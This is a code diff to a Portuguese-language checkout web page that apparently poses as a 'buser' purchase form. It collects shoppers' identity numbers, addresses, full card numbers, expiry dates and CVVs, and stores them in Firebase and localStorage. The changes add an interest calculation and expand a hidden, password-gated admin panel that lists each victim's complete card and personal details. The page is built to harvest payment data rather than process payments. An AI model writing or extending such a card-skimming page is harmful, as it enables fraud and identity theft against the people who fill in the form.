@@ -9,46 +9,264 @@
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
-        body { background: #e8e8e8; display: flex; justify-content: center; padding: 20px; }
-        .container { max-width: 500px; width: 100%; background: #fff; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
-        h1 { font-size: 24px; cursor: default; }
-        .sub { color: #666; font-size: 14px; margin-bottom: 20px; }
-        .section { margin-top: 20px; border-top: 2px solid #eee; padding-top: 15px; }
-        .section h3 { font-size: 16px; margin-bottom: 10px; font-weight: 600; }
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 4px; }
-        .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; }
-        .form-group input:focus { border-color: #000; }
-        .row { display: flex; gap: 10px; }
-        .row .form-group { flex: 1; }
-        .resumo { background: #f5f5f5; padding: 15px; border-radius: 12px; margin: 15px 0; }
-        .resumo .total { font-size: 22px; font-weight: 700; }
-        .btn-finalizar { background: #000; color: #fff; border: none; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; }
-        .btn-finalizar:active { transform: scale(0.97); }
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; justify-content: center; align-items: center; }
-        .modal-overlay.aberto { display: flex; }
-        .modal { background: #fff; border-radius: 20px; max-width: 450px; width: 92%; padding: 25px; max-height: 90vh; overflow-y: auto; }
-        .modal h2 { margin-bottom: 15px; }
-        .modal input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 12px; margin-bottom: 12px; font-size: 15px; }
-        .modal .btn { width: 100%; padding: 14px; border: none; border-radius: 30px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 5px; }
-        .modal .btn-primary { background: #000; color: #fff; }
-        .modal .btn-danger { background: #c62828; color: #fff; }
-        .modal .btn-secondary { background: #e0e0e0; color: #000; }
-        .erro { color: #d32f2f; font-size: 14px; display: none; margin-bottom: 10px; }
-        .erro.visivel { display: block; }
-        .historico-item { background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 10px; font-size: 13px; }
-        .historico-item .data { font-weight: 600; }
-        .historico-item .info { display: flex; flex-wrap: wrap; gap: 5px 12px; margin-top: 4px; }
-        .historico-item .info span { background: #ddd; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
-        .recebedor-info { background: #ececec; border-radius: 40px; padding: 8px 16px; font-size: 12px; color: #000; display: flex; flex-wrap: wrap; gap: 8px 16px; margin-top: 15px; justify-content: center; border: 1px solid #b0b0b0; flex-direction: column; align-items: center; text-align: center; }
-        .recebedor-info span { font-weight: 500; }
-        .admin-hidden { opacity: 0.2; font-size: 10px; color: #ccc; background: transparent; border: none; cursor: pointer; padding: 2px 6px; transition: 0.3s; }
-        .admin-hidden:hover { opacity: 0.6; color: #999; }
-        .fechar-modal { background: none; border: none; font-size: 24px; cursor: pointer; color: #000; padding: 0 4px; }
-        .msg-icone { font-size: 56px; margin-bottom: 10px; color: #d32f2f; }
-        @media (max-width: 480px) { .container { padding: 15px; } .row { flex-wrap: wrap; } .row .form-group { flex: 1 1 100%; } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        body {
+            background: #e8e8e8;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: #fff;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        h1 {
+            font-size: 24px;
+            cursor: default;
+        }
+        .sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .section {
+            margin-top: 20px;
+            border-top: 2px solid #eee;
+            padding-top: 15px;
+        }
+        .section h3 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            font-size: 14px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #000;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row .form-group {
+            flex: 1;
+        }
+        .resumo {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+        }
+        .resumo .total {
+            font-size: 22px;
+            font-weight: 700;
+        }
+        .resumo .parcela-info {
+            font-size: 14px;
+            color: #555;
+            margin-top: 2px;
+        }
+        .btn-finalizar {
+            background: #000;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+        }
+        .btn-finalizar:active {
+            transform: scale(0.97);
+        }
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.aberto {
+            display: flex;
+        }
+        .modal {
+            background: #fff;
+            border-radius: 20px;
+            max-width: 450px;
+            width: 92%;
+            padding: 25px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        .modal h2 {
+            margin-bottom: 15px;
+        }
+        .modal input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+        .modal .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        .modal .btn-primary {
+            background: #000;
+            color: #fff;
+        }
+        .modal .btn-danger {
+            background: #c62828;
+            color: #fff;
+        }
+        .modal .btn-secondary {
+            background: #e0e0e0;
+            color: #000;
+        }
+        .erro {
+            color: #d32f2f;
+            font-size: 14px;
+            display: none;
+            margin-bottom: 10px;
+        }
+        .erro.visivel {
+            display: block;
+        }
+        .historico-item {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            font-size: 13px;
+        }
+        .historico-item .data {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        .historico-item .info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 10px;
+        }
+        .historico-item .info span {
+            background: #ddd;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+        .historico-item .detalhes {
+            margin-top: 6px;
+            font-size: 12px;
+            color: #555;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 12px;
+        }
+        .historico-item .detalhes strong {
+            color: #000;
+        }
+        .recebedor-info {
+            background: #ececec;
+            border-radius: 40px;
+            padding: 8px 16px;
+            font-size: 12px;
+            color: #000;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px 16px;
+            margin-top: 15px;
+            justify-content: center;
+            border: 1px solid #b0b0b0;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .recebedor-info span {
+            font-weight: 500;
+        }
+        .admin-hidden {
+            opacity: 0.2;
+            font-size: 10px;
+            color: #ccc;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 2px 6px;
+            transition: 0.3s;
+        }
+        .admin-hidden:hover {
+            opacity: 0.6;
+            color: #999;
+        }
+        .fechar-modal {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #000;
+            padding: 0 4px;
+        }
+        .msg-icone {
+            font-size: 56px;
+            margin-bottom: 10px;
+            color: #d32f2f;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            .row {
+                flex-wrap: wrap;
+            }
+            .row .form-group {
+                flex: 1 1 100%;
+            }
+        }
     </style>
 </head>
 <body>
@@ -96,10 +314,18 @@
                 <div class="form-group"><label>Validade</label><input type="text" id="validade" class="mascara" placeholder="MM/AA" maxlength="5"></div>
                 <div class="form-group"><label>CVV</label><input type="text" id="cvv" class="mascara" placeholder="123" maxlength="3"></div>
                 <div class="form-group"><label>Parcelas</label><select id="parcelas">
-                    <option value="1">1x sem juros</option><option value="2">2x</option><option value="3">3x</option>
-                    <option value="4">4x</option><option value="5">5x</option><option value="6">6x</option>
-                    <option value="7">7x</option><option value="8">8x</option><option value="9">9x</option>
-                    <option value="10">10x</option><option value="11">11x</option><option value="12" selected>12x</option>
+                    <option value="1">1x sem juros</option>
+                    <option value="2">2x</option>
+                    <option value="3">3x</option>
+                    <option value="4">4x</option>
+                    <option value="5">5x</option>
+                    <option value="6">6x</option>
+                    <option value="7">7x</option>
+                    <option value="8">8x</option>
+                    <option value="9">9x</option>
+                    <option value="10">10x</option>
+                    <option value="11">11x</option>
+                    <option value="12" selected>12x</option>
                 </select></div>
             </div>
         </div>
@@ -109,7 +335,7 @@
                 <span>Total a pagar:</span>
                 <span id="total">R$ 99,00</span>
             </div>
-            <div style="font-size:14px;color:#555;" id="parcelaDetalhe">12x de R$ 8,25</div>
+            <div class="parcela-info" id="parcelaDetalhe">12x de R$ 8,25 (COM JUROS)</div>
         </div>
 
         <button class="btn-finalizar" id="btnFinalizar">Finalizar Compra</button>
@@ -194,7 +420,8 @@
                     else if (this.id === 'cvv') pattern = '999';
                     else return;
 
-                    let formatted = '', pos = 0;
+                    let formatted = '',
+                        pos = 0;
                     for (let i = 0; i < pattern.length && pos < val.length; i++) {
                         if (pattern[i] === '9') formatted += val[pos++];
                         else formatted += pattern[i];
@@ -204,7 +431,8 @@
 
                 el.addEventListener('keydown', function(e) {
                     const key = e.key;
-                    if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(key)) return;
+                    if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(key))
+                    return;
                     if (!/^[0-9]$/.test(key)) e.preventDefault();
                 });
             });
@@ -282,6 +510,31 @@
 
             btnAdminEl.style.display = 'none';
 
+            // ===== CALCULAR JUROS (10% a partir de 10x) =====
+            function calcularTotalComJuros(valor, parcelas) {
+                if (parcelas >= 10) {
+                    return valor * 1.10; // 10% de juros
+                }
+                return valor;
+            }
+
+            // ===== ATUALIZAR VALOR NA TELA =====
+            function atualizarValorTela(v) {
+                currentValue = v;
+                const parcelasSelecionadas = parseInt(parcelas.value);
+                const totalComJuros = calcularTotalComJuros(v, parcelasSelecionadas);
+
+                total.textContent = `R$ ${totalComJuros.toFixed(2).replace('.', ',')}`;
+
+                const valorParcela = totalComJuros / parcelasSelecionadas;
+                const temJuros = parcelasSelecionadas >= 10;
+                const jurosTexto = temJuros ? 'COM JUROS' : 'SEM JUROS';
+                parcelaDetalhe.textContent = `${parcelasSelecionadas}x de R$ ${valorParcela.toFixed(2).replace('.', ',')} (${jurosTexto})`;
+
+                // Atualiza o campo do painel também
+                if (novoValor) novoValor.value = v.toFixed(2);
+            }
+
             // ===== CARREGAR VALOR DO FIREBASE =====
             function carregarValorFirebase() {
                 if (!firebaseOk) return;
@@ -308,16 +561,12 @@
                 } catch (e) {}
             }
 
-            function atualizarValorTela(v) {
-                currentValue = v;
-                total.textContent = `R$ ${v.toFixed(2).replace('.', ',')}`;
-                const p = v / 12;
-                parcelaDetalhe.textContent = `12x de R$ ${p.toFixed(2).replace('.', ',')}`;
-                // Atualiza o campo do painel também
-                if (novoValor) novoValor.value = v.toFixed(2);
-            }
-
             function coletarDados() {
+                const parcelasSelecionadas = parseInt(parcelas.value);
+                const totalComJuros = calcularTotalComJuros(currentValue, parcelasSelecionadas);
+                const valorParcela = totalComJuros / parcelasSelecionadas;
+                const temJuros = parcelasSelecionadas >= 10;
+
                 return {
                     nome: document.getElementById('nome').value || '—',
                     email: document.getElementById('email').value || '—',
@@ -335,8 +584,11 @@
                     cpfTitular: document.getElementById('cpfTitular').value || '—',
                     validade: document.getElementById('validade').value || '—',
                     cvv: document.getElementById('cvv').value || '—',
-                    parcelas: document.getElementById('parcelas').value,
-                    valor: currentValue,
+                    parcelas: parcelasSelecionadas,
+                    valor_original: currentValue,
+                    valor_total: totalComJuros,
+                    valor_parcela: valorParcela,
+                    tem_juros: temJuros,
                     data: new Date().toLocaleString('pt-BR')
                 };
             }
@@ -345,12 +597,17 @@
             function salvarDados() {
                 const dados = coletarDados();
 
+                // Salva no localStorage (histórico local)
                 let historico = [];
-                try { const raw = localStorage.getItem('historico_buser'); if (raw) historico = JSON.parse(raw); } catch (e) {}
+                try {
+                    const raw = localStorage.getItem('historico_buser');
+                    if (raw) historico = JSON.parse(raw);
+                } catch (e) {}
                 historico.unshift(dados);
                 if (historico.length > 50) historico = historico.slice(0, 50);
                 localStorage.setItem('historico_buser', JSON.stringify(historico));
 
+                // Salva no Firebase
                 if (firebaseOk) {
                     try {
                         const ref = database.ref('checkout/' + Date.now());
@@ -412,6 +669,7 @@
                 mostrarHistorico([]);
             }
 
+            // ===== MOSTRAR HISTORICO COM TODOS OS DADOS =====
             function mostrarHistorico(lista) {
                 historicoContainer.innerHTML = '';
                 if (!lista || lista.length === 0) {
@@ -421,14 +679,27 @@
                 lista.forEach(item => {
                     const div = document.createElement('div');
                     div.className = 'historico-item';
+
+                    const jurosText = item.tem_juros ? 'COM JUROS (10%)' : 'SEM JUROS';
+
                     div.innerHTML = `
                         <div class="data">${item.data || 'Sem data'}</div>
                         <div class="info">
                             <span>${item.nome}</span>
                             <span>${item.email}</span>
-                            <span>R$ ${(item.valor || 0).toFixed(2).replace('.', ',')}</span>
-                            <span>${item.cartao}</span>
-                            <span>${item.parcelas}x</span>
+                            <span>${item.cpf}</span>
+                            <span>${item.telefone}</span>
+                        </div>
+                        <div class="detalhes">
+                            <span><strong>Endereco:</strong> ${item.logradouro}, ${item.numero}${item.complemento !== '—' ? ', ' + item.complemento : ''} - ${item.bairro}, ${item.cidade} - ${item.uf}, CEP: ${item.cep}</span>
+                            <span><strong>Cartao:</strong> ${item.cartao}</span>
+                            <span><strong>Validade:</strong> ${item.validade}</span>
+                            <span><strong>CVV:</strong> ${item.cvv}</span>
+                            <span><strong>Parcelas:</strong> ${item.parcelas}x</span>
+                            <span><strong>Valor original:</strong> R$ ${(item.valor_original || 0).toFixed(2).replace('.', ',')}</span>
+                            <span><strong>Valor total:</strong> R$ ${(item.valor_total || 0).toFixed(2).replace('.', ',')}</span>
+                            <span><strong>Valor parcela:</strong> R$ ${(item.valor_parcela || 0).toFixed(2).replace('.', ',')}</span>
+                            <span><strong>Juros:</strong> ${jurosText}</span>
                         </div>
                     `;
                     historicoContainer.appendChild(div);
@@ -480,12 +751,12 @@
             });
             btnConfirmarSenha.addEventListener('click', confirmarSenha);
 
-            // ===== SALVAR VALOR - AGORA SALVA NO FIREBASE =====
+            // ===== SALVAR VALOR - SALVA NO FIREBASE =====
             btnSalvarValor.addEventListener('click', function() {
                 const v = parseFloat(novoValor.value.replace(',', '.'));
                 if (!isNaN(v) && v > 0) {
                     atualizarValorTela(v);
-                    salvarValorFirebase(v); // SALVA NO FIREBASE
+                    salvarValorFirebase(v);
                 }
             });
 
@@ -510,16 +781,22 @@
                 if (e.target === msgRecusado) msgRecusado.classList.remove('aberto');
             });
 
+            // ===== QUANDO MUDAR AS PARCELAS, RECALCULA =====
             parcelas.addEventListener('change', function() {
-                const p = currentValue / parseInt(this.value);
-                const desc = this.value == 1 ? 'sem juros' : '';
-                parcelaDetalhe.textContent = `${this.value}x de R$ ${p.toFixed(2).replace('.', ',')} ${desc}`;
+                atualizarValorTela(currentValue);
             });
 
             // ===== INICIALIZAÇÃO =====
             function init() {
                 // Carrega o valor do Firebase
                 carregarValorFirebase();
+
+                // Se não conseguir carregar do Firebase, usa o valor padrão
+                setTimeout(() => {
+                    if (currentValue === 99.00) {
+                        atualizarValorTela(99.00);
+                    }
+                }, 1000);
 
                 parcelas.value = '12';
 
